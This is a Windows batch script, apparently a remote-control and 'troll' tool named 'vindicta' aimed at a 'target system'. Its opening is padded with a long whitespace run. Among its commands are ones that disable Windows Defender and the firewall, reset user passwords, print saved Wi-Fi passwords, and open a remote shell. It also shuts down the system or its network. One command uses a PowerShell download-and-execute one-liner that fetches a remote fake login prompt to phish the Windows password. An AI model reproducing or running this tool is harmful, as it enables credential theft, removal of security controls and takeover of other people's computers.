@echo off
chcp 65001 >nul																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																
FOR /F "tokens=4 delims= " %%d in ('route print ^| find " 0.0.0.0"') do set intip=%%d
For /f %%b in (
  'powershell -nop -c "(Invoke-RestMethod http://api.ipify.org)"'
) Do Set ExtIP=%%b
echo.
:main
ping localhost -n 2 >nul
set /p input="vindicta > "

if /I "%input%" EQU "help" (
goto help
)

if /I "%input%" EQU "getinfo" (
echo Username : %username%
echo Domain : %computername%
echo Public IP : %extip%
echo Private IP : %intip%
echo Processors : %number_of_processors%
echo Operating System : %os%
echo System Drive : %systemdrive%
echo.
goto main
)

if /I "%input%" EQU "monitor" (
nircmd.exe monitor off
goto main
)

if /I "%input%" EQU "website" (
goto web
)

if /I "%input%" EQU "admincheck" (
goto admincheck
)

if /I "%input%" EQU "listuser" (
net user
goto main
)

if /I "%input%" EQU "disconnect" (
netsh wlan disconnect
goto main
)

if /I "%input%" EQU "ddos" (
FOR /F "tokens=3 delims= " %%f in ('netsh wlan show interface ^| find " Name"') do set netname=%%f
ping localhost -n 2 >nul
netsh interface set interface name="%netname%" admin=DISABLED
goto main
)


if /I "%input%" EQU "passwd" (
set /p puser=What users password to change: 
set /p ppass=Enter new password: 
net user %puser% %ppass% >nul
echo Password Successfully changed to %ppas%
goto main
)

if /I "%input%" EQU "crash" (
goto msg
)

if /I "%input%" EQU "message" (
goto msg
)

if /I "%input%" EQU "shell" (
cd %userprofile%
call cmd.exe
echo.
goto main
)

if /I "%input%" EQU "shutdown" (
set /p shutmsg=Enter message to show before shutdown: 
shutdown /s /c "%shutmsg%"
echo.
goto main
)

if /I "%input%" EQU "ps" (
cd %userprofile%
call powershell
goto main
)

if /I "%input%" EQU "defdisable" (
powershell -command Set-MpPreference -DisableRealtimeMonitoring $true
goto main
)
if /I "%input%" EQU "fwdisable" (
netsh advfirewall set allprofiles state off
goto main
)

if /I "%input%" EQU "geolocate" (
goto geo
)

if /I "%input%" EQU "wifipass" (
goto wifipass
)

if /I "%input%" EQU "winpass" (
goto winphish
)

) else (
echo Invalid Command
goto main
)

exit

:geo
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
if exist "%temp%\%webclient%.vbs" del "%temp%\%webclient%.vbs" /f /q /s >nul
if exist "%temp%\response.txt" del "%temp%\response.txt" /f /q /s >nul
:iplookup
set ip=%extip%
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs
:localip
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
pause
goto menu
:response_exist
echo.
for /f "delims=     " %%i in ('findstr /i "," %temp%\response.txt') do (
    set data=%%i
    set data=!data:,=!
    set data=!data:""=Not Listed!
    set data=!data:"=!
    set data=!data:ip:=IP:      !
    set data=!data:hostname:=Hostname:  !
    set data=!data:org:=ISP:        !
    set data=!data:city:=City:      !
    set data=!data:region:=State:   !
    set data=!data:country:=Country:    !
    set data=!data:postal:=Postal:  !
    set data=!data:loc:=Location:   !
    set data=!data:timezone:=Timezone:  !
    echo !data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
if '%ip%'=='' goto main
goto main

exit

:msg
echo.
set /p title=Enter title of MessageBox: 
set /p text=Enter message of MessageBox: 
set /p icon=What Icon on MessageBox(Information, Error, Question): 
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%text%', '%title%', 'OK', [System.Windows.Forms.MessageBoxIcon]::%icon%);}"
goto main

exit

:admincheck
    net session >nul 2>&1
    if %errorLevel% == 0 (
        echo Administrative permissions confirmed.
    ) else (
        echo Administrative permissions not found.
    )
goto main

exit

:help
echo.
echo -------------------
echo   System Commands
echo -------------------
echo.
echo listuser - Lists all system users
echo passwd - Change user password (Requires Admin)
echo defdisable - Disables Windows Defender (Requires Admin)
echo fwdisable - Disables Windows Firewall (Requires Admin)
echo.
echo --------------------
echo    Info Commands
echo --------------------
echo.
echo getinfo - Lists information about target system
echo geolocate - locates geolocation of target system
echo.
echo ---------------------
echo   Password Commands
echo ---------------------
echo.
echo wifipass - Displays the password of network in use
echo winpass - attempts to phish the windows password
echo.
echo ------------------
echo   Troll Commands
echo ------------------
echo.
echo shutdown - Shutdowns down target system
echo message - Send messagebox to target system
echo website - Open specified website on target system
echo crash - Loops cmd.exe opening until system crash
echo disconnect - Disconnects from current wifi
echo adapter - Disables network adapter
echo.
echo ------------------
echo   Extra Commands
echo ------------------
echo.
echo admincheck - Check for Administrator priviledges
echo shell - Remote shell 
echo ps - Remote powershell
echo.
goto main

exit

:web
set /p url=Enter URL: 
set /p webr=Enter web browser(chrome, firefox, opera): 
start %webr%.exe %url%
goto main

exit

:winphish
echo Waiting...
powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1’)); Invoke-LoginPrompt
echo.
goto main

exit

:wifipass
setlocal enabledelayedexpansion
echo.

    call :get-profiles r

    :main-next-profile
        for /f "tokens=1* delims=," %%a in ("%r%") do (
            call :get-profile-key "%%a" key
            if "!key!" NEQ "" (
                echo WiFi Network: [%%a] Password: [!key!]
            )
            set r=%%b
        )
        if "%r%" NEQ "" goto main-next-profile

	goto main

    goto :eof

:get-profile-key <1=profile-name> <2=out-profile-key>
    setlocal

    set result=

    FOR /F "usebackq tokens=2 delims=:" %%a in (
        `netsh wlan show profile name^="%~1" key^=clear ^| findstr /C:"Key Content"`) DO (
        set result=%%a
        set result=!result:~1!
    )
    (
        endlocal
        set %2=%result%
    )

    goto :eof

:get-profiles <1=result-variable>
    setlocal

    set result=

   
    FOR /F "usebackq tokens=2 delims=:" %%a in (
        `netsh wlan show profiles ^| findstr /C:"All User Profile"`) DO (
        set val=%%a
        set val=!val:~1!

        set result=%!val!,!result!
    )
    (
        endlocal
        set %1=%result:~0,-1%
    )

    goto :eof
